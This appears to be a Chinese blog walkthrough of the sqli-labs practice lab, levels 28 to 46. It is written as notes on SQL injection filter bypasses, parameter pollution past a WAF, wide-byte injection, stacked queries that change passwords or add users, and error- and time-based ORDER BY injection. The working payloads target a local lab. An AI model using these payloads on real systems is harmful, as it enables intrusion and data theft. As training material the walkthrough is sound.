<p><img src="https://img-blog.csdnimg.cn/fd9390d6f73648cb91568ccc070404fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>测试</p>
<p> %09 可以重当空格 union select 可大小写绕过 </p>
<p><img src="https://img-blog.csdnimg.cn/e7df919f08394d559093dd89e7f140f4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"> <img src="https://img-blog.csdnimg.cn/9d22ccdfb4e544dfbd0aa7cfbb0c8e78.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h1><p>测试：单引号加括号闭合</p>
<p><img src="https://img-blog.csdnimg.cn/74be7ba5201e49e48fe57af3e041c6c9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> %09 ——》 空格<img src="https://img-blog.csdnimg.cn/919505ca737a438cba94acb10e155bdf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 查看nuion select 的过滤方式</p>
<p><img src="https://img-blog.csdnimg.cn/1a9cabd7c5bd4d8b98ca5c1f482ab933.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">我们可以 双写绕过 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-28/?id=111111&#x27;) %09 unionunion%09 select%09 select%09 1,2,3  ||(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/96d5f80819944ee0a212a0586cab23db.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h1><p>测试：单引号加括号闭合 </p>
<p><img src="https://img-blog.csdnimg.cn/b340e2e39f6242ee889527e3ccdbaa40.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/e8e1119564d744d29224b0ec14b39e3f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-29-基于WAF的一个错误"><a href="#less-29-基于WAF的一个错误" class="headerlink" title="less-29 基于WAF的一个错误"></a>less-29 基于WAF的一个错误</h1><p><a href="https://www.bilibili.com/video/BV1JE411b7kz?p=1">B站 踩坑视频（必看）</a>只有看来视频才能明白29关的真正含义</p>
<p>HTTP参数污染（HTTP Parameter Pollution） 攻击者通过在HTTP请求中插入特定的参数来发起攻击,如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击</p>
<p><img src="https://img-blog.csdnimg.cn/20201008205317195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="https://img-blog.csdnimg.cn/20201008204210607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容</p>
<p>我们的后端是apache，那么我们只要将参数放在后面即可</p>
<p>一个参数 id=1 时访问的是Dumb </p>
<p><img src="https://img-blog.csdnimg.cn/b9a5a57abfff4430bf9bd7ee4b526116.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>在之后加上单引号之后会发现 ：页面提示 攻击受阻，被waf 防护</p>
<p><img src="https://img-blog.csdnimg.cn/092662b3435248ce8d3f89fc4d9540b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>但是我们只需要再加一个参数 ，最后加上单引号，就会发现报错，说明可以注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/sqli-labs/Less-29/?id=1&amp;id=3 &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/aacd6874445c49bd89532cc3e10a17b4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>开始注入，是第二个参数 等于-3 就会发现有回显</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/sqli-labs/Less-29/?id=1&amp;id=-3 &#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/08e60d664f914787bb5afe54bb9ab31e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 总结</p>
<p>​    上面已经说过，waf服务器（tomcat）只解析重复参数里面的前者，而真正的web服务器（Apache）只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容。</p>
<p>​    我们的后端是apache，那么我们只要将参数放在后面即可</p>
<h1 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h1><p>双引号 闭合 </p>
<p><img src="https://img-blog.csdnimg.cn/96720c6af6144c9d9c0b0de464be6d24.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h1><p>双引号加括号 闭合 </p>
<p><img src="https://img-blog.csdnimg.cn/f4c0632113914a18a0d37262409ea1ba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-32（宽字节注入）"><a href="#less-32（宽字节注入）" class="headerlink" title="less-32（宽字节注入）"></a>less-32（宽字节注入）</h1><p> 我们发现加上的单引号被转义</p>
<p><img src="https://img-blog.csdnimg.cn/eb9812e9518e428bb87bb8614f14d946.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>查看代码</p>
<p><img src="https://img-blog.csdnimg.cn/427f00035b824844a676fda53b989c02.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/20201011101622265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>因为数据库是gbk编码，那么，我们可以进行宽字节注入了<br> 我们尝试%df’，然后将浏览器编码改为gbk，我们可以看到，他变成了汉字</p>
<p>这是因为加上反斜杠也就是%5c之后传入参数整体为%df%5c%27，而前面说过，在mysql里认为前两个字符是一个汉字，也就是‘運’，而后面的单引号就逃逸出来了</p>
<p>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</p>
<p><img src="https://img-blog.csdnimg.cn/27c04fcb818c4fb38e3a57e4db77a2a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h1><p>和上一关一致，只不过换成了addslashe函数</p>
<ul>
<li>addslashes() 函数<br> 函数返回在预定义字符之前添加反斜杠的字符串。<br> 单引号（’）<br> 双引号（”）<br> 反斜杠（\）<br> NULL</li>
<li><img src="https://img-blog.csdnimg.cn/7eba86c796ec4118b3ec873e863d9d0a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></li>
</ul>
<h1 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h1><p> 34关需要在burpsuite中执行 宽字节注入</p>
<h1 id="-7"><a href="#-7" class="headerlink" title></a><img src="https://img-blog.csdnimg.cn/a3099459624f4d08acad6723ad7746e3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></h1><p><img src="https://img-blog.csdnimg.cn/1915c84d488747959d20cbe829f9788f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h1><p>因为语句是数字型，那么，他的过滤都是无用的，我们直接进行数字型的注入即可</p>
<p><img src="https://img-blog.csdnimg.cn/b32bc5071cef4344815dc2896597841b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><br> <img src="https://img-blog.csdnimg.cn/9f01157a5f1b4ef2bcc36763076d2562.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">​</p>
<h1 id="LESS-36"><a href="#LESS-36" class="headerlink" title="LESS-36"></a>LESS-36</h1><p><img src="https://img-blog.csdnimg.cn/66a1f039df404796ba282d00a797c887.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>本关使用了<code>mysql_real_escape_string</code>函数<br> <img src="https://img-blog.csdnimg.cn/20201011110614564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">​</p>
<p>宽字节注入 </p>
<p><img src="https://img-blog.csdnimg.cn/2cb597abca224865bc14c7326b2ec020.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h1><p>这关是post传参</p>
<p><img src="https://img-blog.csdnimg.cn/3c65a22482354e209dc8b36d6b9556cb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h1><p>这一关是堆叠注入</p>
<p>我们使用分号将id 与 sql语句分割 ，尝试修改Dumb 密码 </p>
<p><img src="https://img-blog.csdnimg.cn/e451f82a075648d4a0eba9eff0e3f21c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"> 我们再次登录发现密码已经修改</p>
<p><img src="https://img-blog.csdnimg.cn/f89cdc1c4a8a477ab31fdb8dbe056cfb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h1><p>闭合条件</p>
<p>$sql=”SELECT * FROM users WHERE id=$id LIMIT 0,1”;</p>
<p><img src="https://img-blog.csdnimg.cn/aaea21e0b3aa4a4da0c31617c953822e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 因为是数字型，那么我们这次尝试新增一个用户吧<img src="https://img-blog.csdnimg.cn/21dec99560f746149ef85dec7c9c9aff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 验证 ，id=31 登录成功 </p>
<p><img src="https://img-blog.csdnimg.cn/a4407fd5d8f84bbfa865adec9ff17486.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h1><p>没有了报错，我们可以根据页面回显测试</p>
<p>闭合条件，其余与38关一致</p>
<p><img src="https://img-blog.csdnimg.cn/506873ea42a94333b129e0766290bc21.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h1><p>关闭了报错，其余与39关一致</p>
<h1 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h1><p><img src="https://img-blog.csdnimg.cn/e507f2952e944a4e95d76a7159a081a4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>源码在password处没有处理，可以考虑注入。经测试发现可以注入 </p>
<p><img src="https://img-blog.csdnimg.cn/a8c791300a2349f1af3e5fcb8a409dcb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>修改密码成功</p>
<p><img src="https://img-blog.csdnimg.cn/a3edf695cf5c48328a38dcdcb577ad06.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h1><p><img src="https://img-blog.csdnimg.cn/833f38ac9dee47e4a1a21256eee3f394.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>测试闭合条件为 ‘)，与上一关一致 </p>
<p><img src="https://img-blog.csdnimg.cn/e652cf71dbf740ad8b3d0bc3d91f96c7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h1><p>同less-42关，只是关闭了报错</p>
<h1 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h1><p>同less-43关，只是关闭了报错</p>
<h1 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h1><p>根据提示 输入sort=1</p>
<p><img src="https://img-blog.csdnimg.cn/7aa03637ba3748eea286e96f9efdaf42.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们查看源码会发现 ，sql语句根据传进去的值进行排序</p>
<p><img src="https://img-blog.csdnimg.cn/9cac94564701408e9b73a8dd72522ee8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>输入sort=2 发现根据第二列排序 </p>
<p><img src="https://img-blog.csdnimg.cn/13678dcc91ef4c8bbf3c7c4240ada2a3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 在sort 参数后加上 desc 倒序，会发现排列顺序发生了改变， 说明存在注入。</p>
<p><img src="https://img-blog.csdnimg.cn/7035628fb6d64eaa9afca7b1ff9cafbf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们直接修改参数即可注入。、测试：页面返回正确</p>
<p><img src="https://img-blog.csdnimg.cn/518f8c16395c43058be3e6ff8f045be9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 这里有两种方法，报错注入和时间注入</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-46/?sort= updatexml(1,concat(0x5e, database()),1)</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/802c4aa963b84d428d9251e941b2459a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-46/?sort= updatexml(1,concat(0x5e,(select  schema_name from information_schema.schemata limit 1,1 ),0x5e ),1)</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/79a99ed0e0484e3ba6eff1c5719bdb21.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAXzFzQUdpcmw=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-46/?sort=3 and if( (length( database() )&gt;1) ,1,sleep(5) ) --+</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
